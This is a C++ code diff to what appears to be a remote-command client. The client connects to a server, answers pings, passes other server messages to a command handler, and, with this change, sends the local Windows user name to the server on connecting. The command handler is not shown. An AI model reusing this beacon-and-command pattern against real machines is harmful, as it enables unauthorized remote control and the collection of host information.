@@ -64,7 +64,18 @@ int main(int argc, char const *argv[]) {
 
 		if (res == 0) {
 			std::cout << "[+] Connected to the server.\n";
-			send(sock, "234", 3, 0);
+
+			char username[1024];
+			DWORD username_len = 1024;
+			GetUserName(username, &username_len);
+
+			std::string username_str = "username: " + std::string(username);
+			int username_str_len = username_str.length();
+			std::cout << "[!] Sending this to the server: " << username_str << "\n";
+			std::cout << "[!] Length: " << username_str_len << "\n";
+
+			send(sock, username_str.c_str(), username_str_len, 0);
+
 			is_connected = true;
 			break;
 		} else {
@@ -95,8 +106,9 @@ int main(int argc, char const *argv[]) {
 			break;
 		}
 
-		if (converted == "ping") send(sock, "pong", 4, 0);
-		else HandleCommands(converted, sock);
+		if (converted == "ping") {
+			send(sock, "pong", 4, 0);
+		} else HandleCommands(converted, sock);
 	}
 
 	std::cout << "[!] Disconnected from the server" << '\n';
